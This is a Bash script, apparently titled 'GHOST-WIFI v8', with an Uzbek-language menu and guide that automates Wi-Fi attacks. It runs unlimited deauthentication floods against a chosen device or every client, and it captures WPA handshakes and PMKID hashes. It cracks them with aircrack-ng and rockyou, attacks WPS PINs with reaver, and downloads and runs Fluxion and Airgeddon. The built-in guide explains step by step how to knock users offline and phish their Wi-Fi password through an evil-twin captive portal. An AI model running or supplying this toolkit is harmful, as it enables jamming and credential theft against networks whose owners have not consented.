#!/bin/bash

# =====================================================================
# GHOST-WIFI v8: MASTER WIRELESS AUDIT SUITE & CYBER GUIDE
# =====================================================================

# Ranglar kodlari
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

check_requirements() {
    clear
    echo -e "${BLUE}[*] Tizim qurollari va qo'llanma paketlari tekshirilmoqda...${NC}"
    for tool in airodump-ng wifite aircrack-ng tshark reaver pixiewps hcxdumptool fluxion airgeddon hostapd dnsmasq lighttpd; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${YELLOW}[!] $tool topilmadi. O'rnatilmoqda...${NC}"
            sudo apt update && sudo apt install $tool -y
        fi
    done
}

get_interface() {
    INTERFACE=$(ip -br link | awk '{print $1}' | grep -E 'wlan|wlp' | head -n 1)
    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[ X ] Xatolik: Wi-Fi adapter topilmadi!${NC}"
        exit 1
    fi
}

show_menu() {
    clear
    echo -e "${CYAN}"
    cat << 'EOF'
 ________  ___  ___  ________  ________  _________
|\   ____|\  |\  |\   __  |\   ____|\___   ___\
\ \  \___|\ \  \\\  \ \  |\  \ \  \___|\|___ \  \_|____________
 \ \  \  __\ \   __  \ \  \\\  \ \_____  \   \ \  |\____________\
  \ \  |\  \  \  \  \  \  \\\  \|____|\  \   \ \  |\____________|
   \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\
    \|_______|\|__|\|__|\|_______|\_________\   \|__|
                                  \|_________|

 ___       __   ___  ________ ___          ___      ___ ________
|\  \     |\  |\  |\  _____\\  \        |\  \    /  /|\   __  \
\ \  \    \ \  \ \  \ \  \__/\ \  \       \ \  \  /  / | \  |\  \
 \ \  \  __\ \  \  \ \   __\\ \  \       \ \  \/  / / \ \   __  \
  \ \  |\__\_\  \  \ \  \_| \ \  \       \ \    / /   \ \  |\  \
   \ \____________\ \__\ \__\   \ \__\       \ \__/ /     \ \_______\
    \|____________|\|__|\|__|    \|__|        \|__|/       \|_______|
EOF
    echo -e "${NC}"

    echo -e "${CYAN}====================================================${NC}"
    echo -e "${MAGENTA}          GHOST-WIFI v8: MASTER EDITION             ${NC}"
    echo -e "${CYAN}====================================================${NC}"
    echo -e "Joriy Wi-Fi adapter: ${GREEN}$INTERFACE${NC}"

    MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -i mode | awk '{print $4}')
    echo -e "Karta joriy rejimi: ${YELLOW}$MODE${NC}"

    echo -e "----------------------------------------------------"
    echo -e "1)  ${YELLOW}Monitor rejimini yoqish${NC} (Monitor Mode ON)"
    echo -e "2)  ${YELLOW}Standart rejimga qaytish${NC} (Managed Mode - Internet ON)"
    echo -e "3)  ${GREEN}NetworkManager xizmatini RESTART qilish${NC}"
    echo -e "4)  ${GREEN}Atrofdagi tarmoqlarni skanerlash${NC} (Airodump)"
    echo -e "5)  ${CYAN}Tanlangan bitta Wi-Fi ichidagi qurilmalarni aniqlash${NC}"
    echo -e "6)  ${RED}DEAUTH ATTACK - Qurilmani tarmoqdan majburiy uzish${NC}"
    echo -e "7)  ${CYAN}WPA Handshake capture (Parol shifrini ovlash)${NC}"
    echo -e "8)  ${MAGENTA}WIFITE AUTOMATOR - Avtomatlashtirilgan audit${NC}"
    echo -e "9)  ${GREEN}AIRCRACK-NG - Ovlangan parollarni tekshirish (Crack)${NC}"
    echo -e "10) ${YELLOW}REAVER & PIXIEWPS - WPS PIN zaifligini tekshirish${NC}"
    echo -e "11) ${MAGENTA}HCXTOOLS - PMKID Capture (Qurilmasiz parol ovlash)${NC}"
    echo -e "12) ${RED}EVIL TWIN PORTAL - Fluxion Avtomatlashtirilgan Hujum${NC}"
    echo -e "13) ${RED}AIRGEDDON SUITE - Kompleks Hakerlik Platformasi${NC}"
    echo -e "14) ${GREEN}HASHCAT CONVERTER - .cap faylni .hc22000 ga o'tkazish${NC}"
    echo -e "15) ${YELLOW}📖 KIBER-AUDIT BO'YICHA MUKAMMAL QO'LLANMA (GUIDE)${NC}"
    echo -e "16) ${RED}Chiqish${NC}"
    echo -e "${CYAN}====================================================${NC}"

    read -p "Amalni tanlang [1-16]: " choice

    case $choice in
        1) enable_monitor_mode ;;
        2) disable_monitor_mode ;;
        3) restart_network_manager ;;
        4) start_scanning ;;
        5) target_scanning ;;
        6) deauth_attack ;;
        7) capture_handshake ;;
        8) run_wifite ;;
        9) run_aircrack ;;
        10) run_reaver ;;
        11) run_pmkid ;;
        12) run_fluxion ;;
        13) run_airgeddon ;;
        14) convert_hashcat ;;
        15) show_guide ;;
        16) exit 0 ;;
        *) 
            echo -e "${RED}\nNoto'g'ri tanlov!${NC}"
            sleep 1
            ;;
    esac
}

enable_monitor_mode() {
    echo -e "\n${BLUE}[*] Tarmoq xizmatlari vaqtincha to'xtatilyapti...${NC}"
    sudo airmon-ng check kill
    echo -e "${BLUE}[*] Monitor Mode faollashtirilmoqda...${NC}"
    sudo airmon-ng start "$INTERFACE"
    if ip link show "${INTERFACE}mon" &> /dev/null; then INTERFACE="${INTERFACE}mon"; fi
    echo -e "${GREEN}[ V ] Monitor Mode tayyor!${NC}"
    read -p "Davom etish uchun Enter bosing..."
}

disable_monitor_mode() {
    echo -e "\n${BLUE}[*] Monitor Mode o'chirilmoqda...${NC}"
    if [[ "$INTERFACE" == *mon ]]; then
        BASE_NAME="${INTERFACE%mon}"
        sudo airmon-ng stop "$INTERFACE"
        INTERFACE=$BASE_NAME
    else
        sudo airmon-ng stop "$INTERFACE"
    fi
    restart_network_manager
}

restart_network_manager() {
    echo -e "\n${BLUE}[*] NetworkManager tizim xizmati qayta ishga tushirilmoqda...${NC}"
    sudo systemctl restart NetworkManager
    echo -e "${BLUE}[*] Wi-Fi adapter tarmog'i majburiy yoqilmoqda...${NC}"
    sudo nmcli radio wifi off
    sudo nmcli radio wifi on
    echo -e "${GREEN}[ V ] NetworkManager muvaffaqiyatli restart qilindi!${NC}"
    read -p "Davom etish uchun Enter bosing..."
}

start_scanning() {
    echo -e "\n${GREEN}[*] Atrofdagi tarmoqlar skanerlanmoqda...${NC}"
    echo -e "${RED}To'xtatish uchun: Ctrl + C bosing.${NC}"
    sleep 2
    sudo airodump-ng --band bg "$INTERFACE"
    read -p "Menyoga qaytish uchun Enter bosing..."
}

target_scanning() {
    echo -e "\n${CYAN}====== MAQSADLI WI-FI TARMOQNI CHUQUR SKANERLASH ======${NC}"
    read -p "Routerning MAC manzili (BSSID): " target_bssid
    read -p "Routerning ishchi kanali (Channel): " target_channel
    echo -e "${RED}To'xtatish uchun: Ctrl + C bosing.${NC}"
    sleep 2
    sudo airodump-ng --bssid "$target_bssid" --channel "$target_channel" "$INTERFACE"
    read -p "Skanerlash yakunlandi. Menyoga qaytish uchun Enter bosing..."
}

deauth_attack() {
    echo -e "\n${RED}====== DEAUTHENTICATION JAMMER ======${NC}"
    read -p "Routerning MAC manzili (BSSID): " target_bssid
    read -p "Routerning ishchi kanali (Channel): " target_channel
    read -p "Telefon MAC manzili (Bo'sh qoldirilsa - hamma uchun): " client_mac
    if [ -z "$client_mac" ]; then client_mac="FF:FF:FF:FF:FF:FF"; fi
    sudo iwconfig "$INTERFACE" channel "$target_channel"
    echo -e "${RED}[!] Hujum boshlandi. To'xtatish uchun Ctrl + C bosing.${NC}"
    sudo aireplay-ng --deauth 0 -a "$target_bssid" -c "$client_mac" "$INTERFACE"
    read -p "Menyoga qaytish uchun Enter bosing..."
}

capture_handshake() {
    echo -e "\n${CYAN}====== WPA HANDSHAKE CAPTURE ======${NC}"
    read -p "Routerning MAC manzili (BSSID): " target_bssid
    read -p "Routerning ishchi kanali (Channel): " target_channel
    read -p "Fayl nomi: " file_name
    mkdir -p "$HOME/Desktop/WiFi_Handshakes"
    echo -e "${RED}Tepada o'ng burchakda 'WPA Handshake' chiqqach, Ctrl + C bosing.${NC}"
    sudo airodump-ng --bssid "$target_bssid" --channel "$target_channel" --write "$HOME/Desktop/WiFi_Handshakes/$file_name" "$INTERFACE"
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_wifite() {
    echo -e "\n${MAGENTA}====== WIFITE AUTOMATOR ======${NC}"
    sudo wifite --kill
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_aircrack() {
    echo -e "\n${GREEN}====== AIRCRACK-NG ======${NC}"
    read -p "Ovlab olingan .cap fayl yo'li: " cap_file
    read -p "Wordlist (Bo'sh bo'lsa standart RockYou): " wordlist
    if [ -z "$wordlist" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    fi
    sudo aircrack-ng -w "$wordlist" "$cap_file"
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_reaver() {
    echo -e "\n${YELLOW}====== REAVER & PIXIEWPS ======${NC}"
    read -p "Routerning MAC manzili (BSSID): " target_bssid
    sudo reaver -i "$INTERFACE" -b "$target_bssid" -K 1 -vv
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_pmkid() {
    echo -e "\n${MAGENTA}====== HCDUMPTOOL: PMKID ATTACK ======${NC}"
    read -p "Fayl nomi: " file_name
    mkdir -p "$HOME/Desktop/WiFi_PMKID"
    sudo hcxdumptool -i "$INTERFACE" -o "$HOME/Desktop/WiFi_PMKID/$file_name.pcapng" --enable_status=1
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_fluxion() {
    echo -e "\n${RED}====== FLUXION: EVIL TWIN AUTOMATOR ======${NC}"
    sleep 2
    if [ -f "/usr/share/fluxion/fluxion.sh" ]; then
        sudo /usr/share/fluxion/fluxion.sh
    elif command -v fluxion &> /dev/null; then
        sudo fluxion
    else
        echo -e "${YELLOW}[!] Fluxion topilmadi. Uni Git orqali yuklab olamiz...${NC}"
        cd /tmp && git clone https://github.com/FluxionNetwork/fluxion.git fluxion && cd fluxion && sudo ./fluxion.sh
    fi
    read -p "Menyoga qaytish uchun Enter bosing..."
}

run_airgeddon() {
    echo -e "\n${RED}====== AIRGEDDON: ALL-IN-ONE WIRELESS SUITE ======${NC}"
    sleep 2
    if command -v airgeddon &> /dev/null; then
        sudo airgeddon
    else
        echo -e "${YELLOW}[!] Airgeddon topilmadi. Yuklab olinmoqda...${NC}"
        cd /tmp && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git airgeddon && cd airgeddon && sudo ./airgeddon.sh
    fi
    read -p "Menyoga qaytish uchun Enter bosing..."
}

convert_hashcat() {
    echo -e "\n${GREEN}====== HASHCAT CONVERTER ======${NC}"
    read -p "Kiritiladigan .cap yoki .pcapng fayl yo'li: " input_file
    read -p "Chiquvchi Hashcat fayl nomi: " out_name
    mkdir -p "$HOME/Desktop/Hashcat_Files"
    if [ -f "$input_file" ]; then
        sudo hcxpcapngtool -o "$HOME/Desktop/Hashcat_Files/$out_name.hc22000" "$input_file"
        echo -e "${GREEN}[ V ] Muvaffaqiyatli o'tkazildi! Fayl: ~/Desktop/Hashcat_Files/$out_name.hc22000${NC}"
    else
        echo -e "${RED}[ X ] Xatolik: Fayl topilmadi!${NC}"
    fi
    read -p "Menyoga qaytish uchun Enter bosing..."
}

show_guide() {
    clear
    echo -e "${YELLOW}========================================================================${NC}"
    echo -e "${GREEN}             📖 KIBER-AUDIT VA WI-FI HAKERLIK MUKAMMAL QO'LLANMASI     ${NC}"
    echo -e "${YELLOW}========================================================================${NC}"
    echo -e "${CYAN}1. WPA HANDSHAKE OVLASH ZANJIRI (4, 6 va 5-modullar):${NC}"
    echo -e "   - Qadam 1: [1] orqali Monitor rejimni yoqing."
    echo -e "   - Qadam 2: [4] orqali router MAC manzili (BSSID) va kanalini (CH) aniqlang."
    echo -e "   - Qadam 3: [5] orqali o'sha router ichida kimlar (STATION MAC) borligini toping."
    echo -e "   - Qadam 4: [7]-modulni (Handshake capture) boshqa terminalda ochib kutib turing."
    echo -e "   - Qadam 5: Asosiy terminalda [6] (Deauth) orqali o'sha telefonga 10 ta paket otib"
    echo -e "     uzib yuboring. Telefon qayta ulanayotganda [7]-modul parolni havoda ilib oladi."
    echo -e ""
    echo -e "${MAGENTA}2. FLUXION (EVIL TWIN - YOVUZ EGIZAK) SCENARIO [12-modul]:${NC}"
    echo -e "   - Dastur ochilgach, Wi-Fi kartangizni tanlang va 'Handshake' qidirishni bosing."
    echo -e "   - Maqsadli Wi-Fi tarmog'ini tanlang. Dastur uydagilar internetini uzib qo'yadi."
    echo -e "   - 'Captive Portal' rejimini tanlang va o'zbek yoki rus tilidagi soxta sahifani bosing."
    echo -e "   - Havoda xuddi o'sha nomda parolsiz yangi tarmoq ochiladi. Odamlar unga ulanib,"
    echo -e "     'Internet ishlamayapti parolni kiriting' degan oynaga o'z qo'li bilan parolni yozadi."
    echo -e "   - Dastur parolni tekshirib, to'g'ri bo'lsa sizga terminalda qizil rangda ko'rsatadi."
    echo -e ""
    echo -e "${RED}3. AIRGEDDON PLATFORMASI BILAN ISHLASH [13-modul]:${NC}"
    echo -e "   - Airgeddon skripti ochilganda u tizim drayverlarini avtomatik tekshiradi."
    echo -e "   - Interfeyslar ro'yxatidan o'zingizning Wi-Fi kartangiz raqamini yozib Enter bosing."
    echo -e "   - Asosiy grafik menyudan '2' (Put interface in monitor mode) ni tanlang."
    echo -e "   - Keyin 'Evil Twin attacks menu' bo'limiga o'ting (Odatda 7 yoki 8-band)."
    echo -e "   - U yerdan 'Evil Twin attack with captive portal' ssenariysini tanlang."
    echo -e "   - Airgeddon 5-6 ta alohida terminal oynalarini ochib, avtomatik ravishda"
    echo -e "     DNS, DHCP, va soxta sayt serverlarini noldan o'zi sozlab hujumni boshlaydi."
    echo -e ""
    echo -e "${BLUE}4. PMKID ATTACK (QURILMASIZ OVLASH) [11-modul]:${NC}"
    echo -e "   - Eng katta afzalligi: Tarmog'ingizda hech kim (telefon) bo'lishi shart emas."
    echo -e "   - [11] moduli orqali to'g'ridan-to'g'ri router bilan bog'lanib, undan bitta"
    echo -e "     paketda xesh parolini sug'urib olasiz. Keyin [14] orqali Hashcat-ga o'tkazasiz."
    echo -e "${YELLOW}========================================================================${NC}"
    read -p "Asosiy menyuga qaytish uchun Enter bosing..."
}

# =====================================================================
# SKRIPTNI ISHGA TUSHIRISH (MAIN EXECUTION)
# =====================================================================
check_requirements
get_interface

# Cheksiz sikl yordamida menyuni ushlab turamiz
while true; do
    show_menu
done
